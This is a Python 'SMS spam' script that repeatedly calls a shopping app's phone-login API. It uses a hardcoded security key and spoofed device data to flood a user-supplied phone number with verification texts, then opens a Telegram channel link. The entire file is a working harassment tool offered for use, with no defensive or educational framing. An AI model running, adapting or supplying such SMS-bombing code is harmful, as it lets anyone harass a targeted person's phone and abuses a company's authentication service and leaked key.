import requests
import pyfiglet
import webbrowser
red_color = '\033[1;31m'
yellow_color = '\033[1;33m'
green_color = '\033[2;32m'
white_color = '\033[1;97m'
blue_color = '\033[1;34m'
light_blue_color = '\033[2;36m'
light_green_color = '\033[1;32m'
light_yellow_color = '\033[1;33m'

ascii_art = pyfiglet.figlet_format("Elgzar")
E = pyfiglet.figlet_format("Spam sms ")
print(green_color + ascii_art)
print(red_color+E )
print(light_blue_color + "by code: Elgzar")
print(blue_color + "By code: Elgzar'")
print("")
nu = input(green_color + "Enter a number : " + light_blue_color)
print("")

m = int(input(green_color + "Enter a Number of messages  : " + light_blue_color))
sent_count = 0

for _ in range(m):
    url3 ="https://new-app.waffarha.com/api/loginByPhone"

    headers3 = {
        "accept": "application/json",
        "accept-language": "ar",
        "accept-encoding": "gzip",
        "content-length": "224",
        "host": "new-app.waffarha.com",
        "content-type": "application/json",
        "end_point": "loginByPhone",
    }

    data3 ='{"security_key":"b320c7a098d7b82fb94ed99976a8398c","city":"3","limit":"5","phone":"%s","app_version":"7.8.45","platform":"Android","device_token":"776f9a112cd0e1d0","lang":"ar","brand":"samsung","store":"PlayStore"}'%(nu)

    r3 = requests.post(url3, headers=headers3, data=data3).text
    if '{"data":{"html_message":' in r3:
        sent_count += 1
        print("   ({} Done send message✅)".format(sent_count))
    elif '{"status":301}' in r3:
        print('ادخل رقم صحيح ')
    else:
        print('لا يمكن عمل الإسبام الرقم خطأ او قد يكون مسجل في البرنامج ')
 
webbrowser.open('https://t.me/Oppsl')         
print('تم عمل الإسبام بنجاح')                       
